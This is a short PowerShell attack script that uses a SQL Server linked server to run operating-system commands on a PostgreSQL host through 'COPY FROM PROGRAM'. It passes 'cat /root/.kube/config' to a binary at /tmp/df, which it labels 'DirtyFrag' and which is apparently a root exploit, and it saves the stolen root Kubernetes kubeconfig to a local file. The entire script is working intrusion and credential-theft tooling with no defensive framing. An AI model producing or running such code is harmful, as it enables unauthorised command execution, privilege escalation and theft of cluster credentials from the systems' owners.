$q=[char]39; $dq=[char]36+[char]36

function PG145-Exec($cmd) {
    sqlcmd -S localhost -x -h -1 -W -Q "EXEC ($q`TRUNCATE cmd_out$q) AT PG145" 2>&1 | Out-Null
    sqlcmd -S localhost -x -h -1 -W -Q "EXEC ($q`COPY cmd_out FROM PROGRAM $dq$cmd$dq$q) AT PG145" 2>&1 | Out-Null
    $r = sqlcmd -S localhost -x -h -1 -W -Q "SELECT * FROM OPENQUERY(PG145,$q`SELECT line FROM cmd_out$q)" 2>&1
    return ($r | Where-Object {$_ -ne "" -and $_ -ne "NULL" -and $_ -notmatch "rows affected|---"})
}

$out = @()

# Run DirtyFrag with cat /root/.kube/config command
$out += "=== KUBECONFIG ==="
$cmd = "export PATH=/usr/bin:/bin:/usr/sbin:/sbin && echo 'cat /root/.kube/config' | timeout 45 /tmp/df 2>/dev/null | grep -v '^#' | grep -v '^\$' | head -200"
$r = PG145-Exec $cmd
$out += $r

# Save
$outPath = Join-Path "F:\Database" "k8s_kubeconfig.txt"
$out | Out-File $outPath -Encoding ASCII
Write-Output "SAVED: $($out.Count) lines"
